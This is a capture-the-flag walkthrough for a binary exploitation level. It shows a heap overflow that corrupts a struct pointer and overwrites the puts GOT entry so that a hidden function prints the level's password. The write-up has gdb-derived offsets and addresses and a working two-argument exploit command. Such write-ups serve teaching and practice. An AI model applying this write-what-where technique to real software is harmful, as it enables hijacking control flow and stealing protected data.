# Way to level8

## Core
`main` builds two heap structs `A` and `B`, each `{ int n; char *buf }` (four `malloc(8)`).
It does `strcpy(A.buf, argv[1])` then `strcpy(B.buf, argv[2])` with **no bounds**, then
`fgets` reads the level8 pass into global `c` (`0x8049960`) — but `main` never prints it.
Only `m()` prints `c` (`printf("%s - %d\n", c, time)`), and `m()` is never called.
Plan: overflow `argv[1]` past `A.buf` to overwrite the **pointer** `B.buf` with `GOT[puts]`;
the second `strcpy` then writes `argv[2]` (= `&m`) into `GOT[puts]`; `main`'s final `puts`
call jumps to `m()`, which prints the already-loaded flag.

## Decisive disass (full: `disas main`, `disas m`, `disas 0x8048400`)
```
main:
<+127>: call strcpy@plt     ; strcpy(A.buf, argv[1]) — no bounds -> overflow into B.buf ptr
<+156>: call strcpy@plt     ; strcpy(B.buf, argv[2]) — B.buf now attacker-chosen -> write-what-where
<+178>: call fopen@plt      ; x/s 0x80486eb = "/home/user/level8/.pass", 0x80486e9 = "r"
<+202>: call fgets@plt      ; fgets(c=0x8049960, 0x44, file) — flag loaded into global c
<+214>: call puts@plt       ; GOT[puts] is hijacked here
m (unused, info functions):
0x080484f4 <+0>             ; m() entry = our target value
<+38>: call printf@plt      ; printf("%s - %d\n", c, ...) — prints global c = the flag
puts@plt:
<+0>:  jmp *0x8049928       ; GOT[puts] = 0x8049928
```

## Exploit
- padding 20 (derivation, gdb): break at `*0x08048588` (before strcpy #1), `run AAAA BBBB`.
  `A.buf = 0x0804a018` (`x/2wx 0x0804a008` → `{1, 0x0804a018}`); the pointer field of B lives
  at `&B.buf = 0x0804a028+4 = 0x0804a02c` (`x/2wx 0x0804a028` → `{2, 0x0804a038}`). Distance
  `0x0804a02c − 0x0804a018 = 0x14 = 20`. We aim at the **pointer slot** `&B.buf`, not B's chunk.
    - Why run is required (not static): A.buf/&B.buf are heap addresses returned by malloc at runtime — absent from the disassembly. Must run (with dummy argv to avoid the NULL-strcpy crash) and read them with x. Only then is the distance measurable. (Contrast: stack offsets like 0x1c(%esp) are static.)
- Values: `GOT[puts] = 0x8049928` (source: `puts@plt+0 jmp *0x8049928`), `m() = 0x080484f4`
  (source: `info functions`/`disas m`+0). Little-endian `\x28\x99\x04\x08`, `\xf4\x84\x04\x08`.
- payload (two args):
  - `argv[1] = 'A'*20 + '\x28\x99\x04\x08'` → strcpy #1 overwrites `B.buf` with `GOT[puts]`.
  - `argv[2] = '\xf4\x84\x04\x08'` → strcpy #2 writes `m()`'s address into `GOT[puts]`.
    (the earlier draft repeated the GOT bytes here by mistake — it must be `m()`'s address)
- Delivery: input is via `argv[1]`/`argv[2]`; the redirected `puts` → `m()` prints the flag,
  so no stdin/cat - trick is needed.
- Why exactly 20 bytes of padding: strcpy #1 starts writing at `b (= A.buf, 0x0804a018)`; the
  target to clobber is c's pointer slot `&B.buf (= c+4, 0x0804a02c)`. That distance
  `0x02c − 0x018 = 0x14 = 20` must be filled with `'A'` so the trailing 4 bytes (the *where*)
  land exactly on the slot. Breakdown: `20 = 16 + 4`. `16` = gap between the `b` chunks
  (`malloc(8)` + glibc header/alignment, no `free` → **measured** at runtime); `4` = offset of
  the pointer field in struct `{int, char*}`, encoded as `0x4(%eax)` in the code → **static**.
  So 20 is not guessed: measured(16) + static(4).
- Reading heap addresses in gdb (why `run`+`break` is required): `a`/`b`/`c`/`d` are the
  heap addresses returned by `malloc` → absent from the disassembly, they exist only at
  runtime. So you must `run` (with dummy argv to avoid the NULL-`strcpy` crash) and read them.
  Contrast: stack offsets `0x1c(%esp)`/`0x18(%esp)` are static, baked into the code.
    - Break just before strcpy #1 (`*0x08048588`): you must inspect the *original* heap before
      strcpy runs; afterwards the input overwrites the structs and pollutes the addresses/gaps.
    - Read path (reading values stored in memory, not computing them):
      - `a`: `x/wx $esp+0x1c` → `0x0804a008`
      - `b`: `x/2wx 0x0804a008` → `{1, 0x0804a018}`. b's address is stored at `a+4` by code
        `+53 mov %edx,0x4(%eax)` (malloc #2's return value written into `a+4`) → `b=0x0804a018`
      - `c`: `x/wx $esp+0x18` → `0x0804a028`; pointer slot `&B.buf = c+4 = 0x0804a02c`
- Finding `GOT[puts]`'s address: `info functions` is for function addresses (`m`, etc.), not the
  GOT — the GOT is a data section and won't show there. Use `objdump -R ./level7` → the address
  on the left of the `puts  R_386_JUMP_SLOT` line, or `x/i puts@plt` → read `0xADDR` from
  `jmp *0xADDR` → `0x8049928`.
- Why the target is `GOT[puts]` (timing): write-what-where = strcpy #1 overwrites `&B.buf` with
  the *address of* `GOT[puts]`, then strcpy #2 (`argv[2]=&m`) writes `m` into that GOT.
    - Why pick `puts`: it is the function called **after** the GOT overwrite completes
      (strcpy #2 at `+156`) — namely `+214 call puts`. Overwriting the GOT of a function that
      already ran wouldn't affect that execution.
    - Effect: at `call puts`, `GOT[puts]=m`, so `m()` runs instead of `puts` → `m` prints the
      pass buffer (`0x8049960`) → flag exposed. In a normal run `puts` only prints the fixed
      string at `0x8048703` and the pass never appears.
```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

## Diff from previous
level6 was a **single** strcpy overflow overwriting a heap **function pointer** that was
immediately invoked by `call *%eax`. level7 needs **two** strcpy's: #1 overflows `A.buf` to
corrupt `B.buf` into a pointer we choose, #2 uses that corrupted pointer as a **write-what-
where** to patch `GOT[puts]` — a GOT overwrite like level5, but driven by a heap overflow +
strcpy instead of a format string. The redirect lands in `m()`, which prints a flag `main`
already loaded but never showed (vs. level6, where `n()` ran `cat` directly).

